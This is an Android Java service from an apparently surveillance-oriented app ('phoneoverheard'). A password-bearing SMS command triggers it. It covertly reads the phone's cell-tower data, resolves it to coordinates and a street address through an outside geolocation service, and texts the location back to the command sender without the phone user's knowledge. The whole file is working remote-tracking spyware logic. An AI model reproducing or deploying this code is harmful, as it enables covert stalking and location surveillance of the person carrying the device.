package com.phoneoverheard.phonne;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.NeighboringCellInfo;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

@SuppressLint({ "SimpleDateFormat", "UnlocalizedSms" })
public class weizhiService extends Service {
    private static final String TAG = "weizhiService";
    @SuppressWarnings("unused")
	private String filecontext = "";
    @SuppressWarnings("unused")
	private String fileNameType = "";
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
    public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
	
    @Override  
    public void onStart(Intent intent, int startId) {  
    	new WifiGPRS(getBaseContext()).CheckAndConnectGPRS();
        Log.i(TAG, "onStart called.");  
        mylog.WrLog("i",TAG,"获取地理位置。");
        Bundle smscontent = intent.getBundleExtra("smscontent");// 根据bundle的key得到对应的对象
        String content=smscontent.getString("content");
        final String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("weizhi").getPassword();		
        if(contents[0].equals("cmd") && contents[1].equals("weizhi") && new FileService().MD5(contents[2]).equals(password)){
	    	new Thread(){
		    	@SuppressLint("UnlocalizedSms")
				@Override
	        	public void run(){
	        		//你要执行的方法
	            	String GpsInfo = "";
	    			String latitude="";
	    			String longitude="";
	    			String address="";
	    			String message = "";
	                try {
	                	final String json = getportLocation(getBaseContext(),sendernumber);
	                    Log.i(TAG, "request = " + json);
	                    mylog.WrLog("i",TAG,"request = " + json);
	                    String url = "http://www.minigps.net/minigps/map/google/location";
	                    GpsInfo = httpPost(url, json);
	                    Log.i(TAG, "result = " + GpsInfo);
	                    mylog.WrLog("i",TAG,"result = " + GpsInfo);
	                    filecontext = "result = " + GpsInfo;
	                } catch (Exception e) {
	                    // TODO Auto-generated catch block
	                    e.printStackTrace();
	                }
	        		if(GpsInfo != ""){
	        			try {  
	        			    JSONTokener jsonParser = new JSONTokener(GpsInfo);  
	        			    // 此时还未读取任何json文本，直接读取就是一个JSONObject对象。  
	        			    // 如果此时的读取位置在"name" : 了，那么nextValue就是"yuanzhifei89"（String）  
	        			    JSONObject person = (JSONObject) jsonParser.nextValue();  
	        			    // 接下来的就是JSON对象的操作了  
	        			    latitude =  person.getJSONObject("location").getString("latitude");//纬度
	        			    longitude =  person.getJSONObject("location").getString("longitude");//经度
	        			    address =  person.getJSONObject("location").getJSONObject("address").getString("street");
	        			} catch (JSONException ex) {  
	        			    // 异常处理代码  
	        			}  
	                    
	                    if (longitude == ""||longitude == "0.0"||latitude == ""||latitude=="0.0") {
	                    	// 获取信息内容
	                        message = "无法获取坐标位置";	                        
	                    }else{
	                    	message = "坐标：\n纬度"+latitude+"\n经度"+longitude+"\n"+address;
	                        // 移动运营商允许每次发送的字节数据有限，我们可以使用Android给我们提供 的短信工具。
	    	                SmsManager sms = SmsManager.getDefault();
	    	                // 如果短信没有超过限制长度，则返回一个长度的List。
	    	                List<String> texts = sms.divideMessage(message);
	    	                for (String text : texts) {
	    	                	sms.sendTextMessage(sendernumber,null, text,  null, null);
	    	                }
	                    }
	                    Log.i(TAG, message);
	                    mylog.WrLog("i",TAG,"坐标位置：" + message);
	        		}
		        	//执行完毕后给handler发送一个空消息
		        	handler.sendEmptyMessage(0);
	        	}
		    }.start();
    	}else{
			// 移动运营商允许每次发送的字节数据有限，我们可以使用Android给我们提供 的短信工具。
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "密码错误！";
	        // 如果短信没有超过限制长度，则返回一个长度的List。
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
		}
        onDestroy();
    } 
    
    /**
     * 功能描述：定义Handler对象
     * @param 无
     */
    @SuppressLint("HandlerLeak")
	private Handler handler =new Handler(){
		@Override
	    //当有消息发送出来的时候就执行Handler的这个方法
	    public void handleMessage(Message msg){
	    super.handleMessage(msg);
	    //处理UI
	    }
    };
	
    /** 
     * 功能描述：通过手机信号获取基站信息 
     * # 通过TelephonyManager 获取lac:mcc:mnc:cell-id 
     * # MCC，Mobile Country Code，移动国家代码（中国的为460）； 
     * # MNC，Mobile Network Code，移动网络号码（中国移动为0，中国联通为1，中国电信为2）；  
     * # LAC，Location Area Code，位置区域码； 
     * # CID，Cell Identity，基站编号； 
     * # BSSS，Base station signal strength，基站信号强度。 
     * @author android_ls 
     */  
    public String getportLocation(Context context,String sendernumber) { 
    	String json = null ;  
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);  
        BufferedReader br = null;  
        try{ 
        	final int cid;
        	final int lac;
            final int mcc = Integer.valueOf(tm.getNetworkOperator().substring(0,3));  
            final int mnc = Integer.valueOf(tm.getNetworkOperator().substring(3,5));  
        	//获取位置区域码（LAC）、基站编号（CID）
            if(2==mnc){
               	CdmaCellLocation location1 = (CdmaCellLocation) tm.getCellLocation();  //中国电信获取LAC、CID的方式  
                if (null == location1){  
                    return null;  
                } 
            	lac = location1.getNetworkId();
            	cid = location1.getBaseStationId();
            }else{      
            	GsmCellLocation gcl = (GsmCellLocation) tm.getCellLocation();  //中国移动和中国联通获取LAC、CID的方式  
                if (null == gcl){  
                    return null;  
                } 
                cid = gcl.getCid();  
                lac = gcl.getLac();
            }            
            // 获取邻区基站信息  
            List<NeighboringCellInfo> infos = tm.getNeighboringCellInfo();  
            StringBuffer sbInfos = new StringBuffer("[CID" + cid + "LAC" + lac + "MCC" + mcc + "MNC" + mnc + "]"); 
            for (NeighboringCellInfo info1 : infos) {     // 根据邻区总数进行循环  
            	sbInfos.append("[LAC" + info1.getLac());  // 取出当前邻区的LAC  
            	sbInfos.append("CID" + info1.getCid());   // 取出当前邻区的CID  
            	sbInfos.append("BSSS" + (-113 + 2 * info1.getRssi()) + "]"); // 获取邻区基站信号强度  
            }
            Log.v(TAG, sbInfos.toString());
            mylog.WrLog("i",TAG,sbInfos.toString());
            SmsManager sms = SmsManager.getDefault();
            // 如果短信没有超过限制长度，则返回一个长度的List。
            sms.sendTextMessage(sendernumber,null, sbInfos.toString(),  null, null);
            json = getJsonCellPos(mcc, mnc, lac, cid);
            return json;
        }catch (Exception e){  
            Log.v(TAG, "获取网络失败，无法获取gps经纬度！");  
            mylog.WrLog("i",TAG,"获取网络失败，无法获取gps经纬度！");
        }finally{  
            if (null != br){  
                try{  
                    br.close();  
                }catch (IOException e){  
                	Log.v(TAG, "获取网络失败，无法获取gps经纬度！"); 
                	mylog.WrLog("i",TAG,"获取网络失败，无法获取gps经纬度！");
                }  
            }  
        }  
        return json;  
    } 
   
    /**
     * 获取JSON形式的基站信息
     * @param mcc 移动国家代码（中国的为460）
     * @param mnc 移动网络号码（中国移动为0，中国联通为1，中国电信为2）； 
     * @param lac 位置区域码
     * @param cid 基站编号
     * @return json
     * @throws JSONException
     */
    private String getJsonCellPos(int mcc, int mnc, int lac, int cid) throws JSONException {
        JSONObject jsonCellPos = new JSONObject();
        jsonCellPos.put("version", "1.1.0");
        //jsonCellPos.put("host", "maps.google.com");  
        jsonCellPos.put("host", "www.minigps.net"); 
        JSONArray array = new JSONArray();
        JSONObject json1 = new JSONObject();
        json1.put("location_area_code", "" + lac + "");
        json1.put("mobile_country_code", "" + mcc + "");
        json1.put("mobile_network_code", "" + mnc + "");
        json1.put("age", 0);
        json1.put("cell_id", "" + cid + "");
        array.put(json1);
        jsonCellPos.put("cell_towers", array);
        return jsonCellPos.toString();
    }

    /**
     * 调用第三方公开的API根据基站信息查找基站的经纬度值及地址信息
     * @param url 获取经纬度服务器地址 http://www.minigps.net/minigps/map/google/location
     * @param jsonCellPos JSON形式的基站信息
     * @return JSON形式的经纬度值及地址信息
     * @throws IOException
     */
    public String httpPost(String url, String jsonCellPos) throws IOException{
        byte[] data = jsonCellPos.toString().getBytes();
        URL realUrl = new URL(url);
        HttpURLConnection httpURLConnection = (HttpURLConnection) realUrl.openConnection();
        httpURLConnection.setConnectTimeout(60 * 1000);
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setDoInput(true);
        httpURLConnection.setUseCaches(false);
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Accept", "application/json, text/javascript, */*; q=0.01");
        httpURLConnection.setRequestProperty("Accept-Charset", "GBK,utf-8;q=0.7,*;q=0.3");
        httpURLConnection.setRequestProperty("Accept-Encoding", "gzip,deflate,sdch");
        httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8");
        httpURLConnection.setRequestProperty("Connection", "Keep-Alive");
        httpURLConnection.setRequestProperty("Content-Length", String.valueOf(data.length));
        httpURLConnection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
        httpURLConnection.setRequestProperty("Host", "www.minigps.net");
        httpURLConnection.setRequestProperty("Referer", "http://www.minigps.net/map.html");
        httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4X-Requested-With:XMLHttpRequest");
        httpURLConnection.setRequestProperty("X-Requested-With", "XMLHttpRequest");
        httpURLConnection.setRequestProperty("Host", "www.minigps.net");
        DataOutputStream outStream = new DataOutputStream(httpURLConnection.getOutputStream());
        outStream.write(data);
        outStream.flush();
        outStream.close();
        if (httpURLConnection.getResponseCode() == HttpURLConnection.HTTP_OK) {
            InputStream inputStream = httpURLConnection.getInputStream();
            return new String(read(inputStream));
        }
        return null;
    }
    
    /**
     * 读取IO流并以byte[]形式存储
     * @param inputSream InputStream
     * @return byte[]
     * @throws IOException
     */
    public byte[] read(InputStream inputSream) throws IOException {
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
        int len = -1;
        byte[] buffer = new byte[1024];
        while ((len = inputSream.read(buffer)) != -1) {
            outStream.write(buffer, 0, len);
        }
        outStream.close();
        inputSream.close();
        return outStream.toByteArray();
    }
    
}
